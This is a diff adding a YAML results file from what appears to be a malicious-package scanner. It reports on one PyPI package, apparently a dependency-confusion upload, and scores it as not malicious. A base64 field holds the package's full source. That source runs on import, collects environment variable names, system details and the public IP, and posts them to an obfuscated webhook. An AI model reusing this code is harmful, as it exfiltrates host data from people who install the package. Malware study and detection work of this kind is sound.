@@ -1,0 +1,21 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/glovo-data-platform-declarative/999.9.17/glovo-data-platform-declarative-999.9.17/glovo-data-platform-declarative-999.9.17/glovo_data_platform/declarative/__init__.py
+  contents:
+  - name: save_some_stuff
+    score: 0.0
+    code: |-
+      def save_some_stuff():
+          try:
+              _save_some_stuff()
+          except:
+              return
+    tokens: TARGETED_FILE resume nop load_global STRING_LEN_S_ENT_HIGH call pop_top return_const None push_exc_info pop_top pop_except return_const None copy pop_except reraise
+    hash: 9f20f513f660d993030f9835905e789605901e9c9211400e1e74c8a06ef5c6e4
+sources:
+  ? .repo_cache/malicious_repos/pypi_malregistry/glovo-data-platform-declarative/999.9.17/glovo-data-platform-declarative-999.9.17/glovo-data-platform-declarative-999.9.17/glovo_data_platform/declarative/__init__.py
+  : aW1wb3J0IG9zCmltcG9ydCBsb2dnaW5nCmltcG9ydCBqc29uCmltcG9ydCB0cmFjZWJhY2sKaW1wb3J0IGJhc2U2NApmcm9tIHVybGxpYiBpbXBvcnQgcmVxdWVzdAoKZGVmIGxvZyhtc2cpOgogICAgcHJpbnQobXNnKQogICAgbG9nZ2VyLmNyaXRpY2FsKG1zZykKICAgIGxvZ2dlci5lcnJvcihtc2cpCiAgICBsb2dnZXIuaW5mbyhtc2cpCiAgICBsb2dnZXIuZGVidWcobXNnKQoKZGVmIHNhdmVfc29tZV9zdHVmZigpOgogICAgdHJ5OgogICAgICAgIF9zYXZlX3NvbWVfc3R1ZmYoKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybgogICAgCmRlZiBfc2F2ZV9zb21lX3N0dWZmKCk6CiAgICB1cmwgPSAoImFIUjBjSE02THk5b2IyOXJjeTV6YkdGIgogICAgICAgICAgICJqYXk1amIyMHZjMlZ5ZG1salpYTXZWREF6UmpSQ1YiCiAgICAgICAgICAgIkZOTEwwSXdOa3RZVlZJNVJESkJMMDVtY1VkcVQxRTNTR3hUWiIKICAgICAgICAgICAiMHN4ZW5aSFNFSnZiWGRDTVE9PSIpCiAgICB1cmwgPSBiYXNlNjQuYjY0ZGVjb2RlKHVybCkuZGVjb2RlKCd1dGYtOCcpCiAgICBkYXRhID0gKAogICAgICAgICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIgogICAgICAgIGYiXHQgc3RhY2s9e3RyYWNlYmFjay5leHRyYWN0X3N0YWNrKCl9XG5cbiIKICAgICAgICBmIlx0IGVudj17ZGljdChvcy5lbnZpcm9uKS5rZXlzKCl9XG5cbiIKICAgICAgICBmIlx0IHVuYW1lPXtvcy51bmFtZSgpfVxuXG4iCiAgICAgICAgZiJcdCBpcD17cmVxdWVzdC51cmxvcGVuKCdodHRwczovL2lwaW5mby5pby9pcCcpLnJlYWQoKS5kZWNvZGUoJ3V0ZjgnKX0iCiAgICApCiAgICBib2R5ID0geyJ0ZXh0IjogZGF0YX0KICAgIGRhdGEgPSBqc29uLmR1bXBzKGJvZHkpCiAgICBkYXRhID0gZGF0YS5lbmNvZGUoKQogICAgcmVxID0gIHJlcXVlc3QuUmVxdWVzdCh1cmwpCiAgICByZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQogICAgcmVxdWVzdC51cmxvcGVuKHJlcSwgZGF0YT1kYXRhKQoKCmxvZ2dlciA9IGxvZ2dpbmcuZ2V0TG9nZ2VyKCkKc2F2ZV9zb21lX3N0dWZmKCkKbG9nKCJmaXggeW91ciBkZXBlbmRlbmNpZXMiKQoKCmV4aXQoMSk=
